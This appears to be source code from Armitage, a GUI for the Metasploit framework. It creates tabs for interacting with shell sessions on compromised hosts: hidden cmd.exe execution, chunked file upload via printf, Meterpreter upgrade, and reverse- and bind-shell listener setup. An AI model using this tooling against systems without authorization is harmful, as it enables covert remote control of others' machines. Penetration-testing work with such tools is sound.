#
# creates a tab for interacting with a shell...
#

import console.*; 
import armitage.*;

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import ui.*;

global('%shells $ashell $achannel %maxq %wait');

%handlers["execute"] = {
	this('$command $channel $pid');

	if ($0 eq "execute") {
		($channel, $pid) = $null;

		if ($2 ismatch "execute -t -H -c -f (.*?)") {
			($command) = matched();
		}
		else if ($2 ismatch "execute -t -H -f (.*?) -c") {
			($command) = matched();
		}
	}
	else if ($0 eq "update" && $2 ismatch 'Channel (\d+) created.') {
		($channel) = matched();
	}
	else if ($0 eq "update" && $2 ismatch 'Process (\d+) created.') {
		($pid) = matched();
	}
	else if ($0 eq "end" && $channel !is $null && $pid !is $null) {
		dispatchEvent(lambda({
			local('$console');

			$console = [new Console: $preferences];
			logCheck($console, sessionToHost($sid), "cmd_ $+ $sid $+ _ $+ $pid");

			%shells[$sid][$channel] = $console;

			[[$console getInput] addActionListener: lambda({
				local('$file $text $handle');

				$text = [[$console getInput] getText];
				[[$console getInput] setText: ""];

				if (%wait[$channel]) {
					[$console append: "[*] Dropped. Waiting for previous command to finish.\n" . [[$console getPromptText] trim]];
					return;
				}
	
				# work around for a whacky behavior with Java meterpreter...
				if ([$text trim] eq "" && "*java*" iswm sessionPlatform($sid)) {
					return;
				}

				if ($client !is $mclient) {
					%wait[$channel] = 1;
					m_cmd($sid, "write -c $channel $text");
				}
				else {
					$handle = openf(">command $+ $sid $+ .txt");
					deleteOnExit("command $+ $sid $+ .txt");
					writeb($handle, "$text $+ \r\n");
					closef($handle);
					$file = getFileProper("command $+ $sid $+ .txt");

					%wait[$channel] = 1;
					m_cmd($sid, "write -f \"" . strrep($file, "\\", "/") . "\" $channel");
				}
			}, \$sid, \$console, \$channel)];

			[$frame addTab: "$command $pid $+ @ $+ $sid", $console, lambda({
				m_cmd($sid, "close $channel");
				m_cmd($sid, "kill $pid");
				%shells[$sid][$channel] = $null;
			}, \$sid, \$channel, \$console, \$pid, \$console), "$command $pid $+ @" . sessionToHost($sid)];

			m_cmd($sid, "read $channel");
		}, \$command, \$channel, \$pid, $sid => $1));
	}
	else if ($0 eq "end") {
		showError($2);
	}
};

%handlers["write"] = {
	this('$channel $ashell');

	if ($0 eq "execute" && $2 ismatch 'write -f .*? (\d+)') {
		($channel) = matched();
		$ashell = %shells[$1][$channel];
	}
	else if ($0 eq "execute" && $2 ismatch 'write -c (\d+) .*') {
		($channel) = matched();
		$ashell = %shells[$1][$channel];
	}
	else if ($0 eq "update" && $2 ismatch '\[\*]\ Wrote \d+ bytes to channel (\d+)\.') {
		deleteFile("command $+ $1 $+ .txt");

		local('$channel $ashell');
		($channel) = matched();
		m_cmd($1, "read $channel");
	}
	else if ($0 eq "update" && $2 ismatch '\[\-\] .*?' && $ashell !is $null) {
		[$ashell append: "\n $+ $2"];
		$ashell = $null;
	}
	else if ($0 eq "timeout") {
		deleteFile("command $+ $1 $+ .txt");
		m_cmd($1, "read $channel");
	}
};

%handlers["read"] = {
	if ($0 eq "update") {
		if ($2 ismatch 'Read \d+ bytes from (\d+):') {
			local('$channel');
			($channel) = matched();
			$ashell = %shells[$1][$channel];
			$achannel = $channel;
		}
	}
	else if ($0 eq "end" && $ashell !is $null) {
		local('$v $count');
		$v = split("\n", [$2 trim]);
		$count = size($v);
		shift($v);
	
		while (size($v) > 0 && $v[0] eq "") {
			shift($v);
		}
		#$v = substr($v, join("\n", $v));
		[$ashell append: [$ashell getPromptText] . join("\n", $v)];
		$ashell = $null;

		# look for a prompt at the end of the text... if there isn't one,
		# then it's time to do another read.
		if (size($v) > 0 && $v[-1] ismatch '.*?[>]{1,2}\s*[\w\d.]+') {
			# this is to catch cases like dir /s c:\ >>somefile.txt
			# doing an immediate read sometimes creates problems.
			# this prevents the read from being immediate so the 
			# channel doesn't lock up.

			# if the command returns faster (e.g., echo "whatever" >somefile)
			# then this condition will never trigger as the prompt will end 
			# the text.
			sleep(1500);
			m_cmd($1, "read $achannel");
		} 
		else if (size($v) > 0 && $v[-1] ismatch '.*?\\? \\(Yes/No/All\\):') {
			# make our shell heuristic tolerant of prompts like this.
			%wait[$achannel] = $null;
		}
		else if (size($v) > 0 && $v[-1] ismatch '.*?\\(Y/N\\)\\?') {
			# make our shell heuristic tolerant of prompts like this.
			%wait[$achannel] = $null;
		}
		else if (size($v) > 0 && $v[-1] ismatch '.*?:') {
			# make our shell heuristic tolerant of more prompts... this is from the time command
			%wait[$achannel] = $null;
		}
		else if (size($v) > 0 && $v[-1] !ismatch '(.*?):\\\\.*?\\>') {
			m_cmd($1, "read $achannel");
		}
		else {
			%wait[$achannel] = $null;
		}
	}
};

sub createShellTab {
	m_cmd($1, "execute -t -H -c -f cmd.exe");
}

sub createCommandTab {
	m_cmd($1, "execute -t -H -c -f $2");
}

sub shellPopup {
        local('$popup');
        $popup = [new JPopupMenu];
        showShellMenu($popup, \$session, \$sid);
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showShellMenu {
	item($1, "Interact", 'I', lambda(&createShellSessionTab, \$sid, \$session));

	setupMenu($1, "shell", @($sid));

	if ("*Windows*" iswm sessionToOS($sid)) {
		item($1, "Meterpreter...", 'M', lambda({
			call_async($client, "session.shell_upgrade", $sid, $MY_ADDRESS, randomPort());
		}, \$sid));
	}
	else {
		item($1, "Upload...", 'U', lambda({
			local('$file $name $n');
			$file = chooseFile($title => "Select file to upload", $always => 1);
			$name = getFileName($file);

			if ($file !is $null) {
				local('$progress');
				$progress = [new ProgressMonitor: $null, "Uploading $name", "Uploading $name", 0, lof($file)];

				call($client, "session.shell_write", $sid, "rm -f $name $+ \n");

				thread(lambda({
					local('$handle $bytes $string $t $start $n $cancel');
					$handle = openf($file);
					$start = ticks();

					while $bytes (readb($handle, 768)) {
						yield 1;

						if ([$progress isCanceled]) {
							call_async($client, "session.shell_write", $sid, "rm -f $name $+ \n");
							closef($handle);
							return;
						}

						# convert the bytes to to octal escapes
						$string = join("", map({ 
							return "\\" . formatNumber($1, 10, 8); 
						}, unpack("B*", $bytes)));

						call($client, "session.shell_write", $sid, "`which printf` \" $+ $string $+ \" >> $+ $name $+ \n");

						$t += strlen($bytes);
						[$progress setProgress: $t]; 
						$n = (ticks() - $start) / 1000.0;
						if ($n > 0) {
							[$progress setNote: "Speed: " . round($t / $n) . " bytes/second"];
						}

						if (available($handle) == 0) {
							closef($handle);
							return;
						}
					}

					closef($handle);
					return;
				}, \$file, \$sid, \$progress, \$name));
			}
		}, \$sid));
		item($1, "Pass Session", 'S', lambda({
			launch_dialog("Pass Session", "post", "multi/manage/system_session", 1, $null, %(SESSION => $sid, LPORT => randomPort(), HANDLER => "1"));
		}, \$sid));
	}

	item($1, "Post Modules", 'P', lambda({
		if ("*Windows*" iswm sessionToOS($sid)) {
			showPostModules($sid);
		}
		else {
			showPostModules($sid, "*",
				ohash(exploit => buildTree(filter({ return iff("*u*x/local/*" iswm $1, $1); }, @exploits)))
			);
		}
	}, \$sid));

	separator($1);
	item($1, "Disconnect", 'D', lambda({
		call_async($client, "session.stop", $sid);
	}, \$sid));
}

sub createShellSessionTab {
	local('$console');
	$console = [new Console: $preferences];
	logCheck($console, sessionToHost($sid), "shell_ $+ $sid");
	[$console setDefaultPrompt: '$ '];
        [$console setPopupMenu: lambda(&shellPopup, \$session, \$sid)];

	thread(lambda({
		local('%r $thread');

		%r = call($mclient, "armitage.lock", $sid, "tab is already open");
		if (%r["error"]) {
			showError(%r["error"]);
			return;
		}

		$thread = [new ConsoleClient: $console, $client, "session.shell_read", "session.shell_write", $null, $sid, 0];
		[$frame addTab: "Shell $sid", $console, lambda({ 
			call_async($mclient, "armitage.unlock", $sid);
			[$thread kill];
		}, \$sid, \$thread), "Shell " . sessionToHost($sid)];
	}, \$sid, \$console));
}

sub listen_for_shellz {
        local('$dialog $port $type $panel $button');
        $dialog = dialog("Create Listener", 640, 480);

        $port = [new ATextField: randomPort() + "", 6];
        $type = [new JComboBox: @("shell", "meterpreter")];

        $panel = [new JPanel];
        [$panel setLayout: [new GridLayout: 2, 1]];

        [$panel add: label_for("Port: ", 100, $port)];
        [$panel add: label_for("Type: ", 100, $type)];

        $button = [new JButton: "Start Listener"];
	[$button addActionListener: lambda({
		local('%options');
		%options["PAYLOAD"] = iff([$type getSelectedItem] eq "shell", "generic/shell_reverse_tcp", "windows/meterpreter/reverse_tcp");
		%options["LHOST"] = "0.0.0.0";
		%options["LPORT"] = [$port getText];
		%options["ExitOnSession"] = "false";
		call_async($client, "module.execute", "exploit", "multi/handler", %options);
		[$dialog setVisible: 0];
	}, \$dialog, \$port, \$type)];

        [$dialog add: $panel, [BorderLayout CENTER]];
        [$dialog add: center($button), [BorderLayout SOUTH]];
        [$dialog pack];

        [$dialog setVisible: 1];
}


sub connect_for_shellz {
        local('$dialog $host $port $type $panel $button');
        $dialog = dialog("Connect", 640, 480);

	$host = [new ATextField: "127.0.0.1", 20];
        $port = [new ATextField: randomPort() + "", 6];
        $type = [new JComboBox: @("shell", "meterpreter")];

        $panel = [new JPanel];
        [$panel setLayout: [new GridLayout: 3, 1]];

	[$panel add: label_for("Host: ", 100, $host)];
        [$panel add: label_for("Port: ", 100, $port)];
        [$panel add: label_for("Type: ", 100, $type)];

        $button = [new JButton: "Connect"];
	[$button addActionListener: lambda({
		local('%options');
		%options["PAYLOAD"] = iff([$type getSelectedItem] eq "shell", "generic/shell_bind_tcp", "windows/meterpreter/bind_tcp");
		%options["LPORT"] = [$port getText];
		%options["RHOST"] = [$host getText];
		warn(%options);
		call_async($client, "module.execute", "exploit", "multi/handler", %options);
		[$dialog setVisible: 0];
	}, \$dialog, \$port, \$type, \$host)];

        [$dialog add: $panel, [BorderLayout CENTER]];
        [$dialog add: center($button), [BorderLayout SOUTH]];
        [$dialog pack];

        [$dialog setVisible: 1];
}

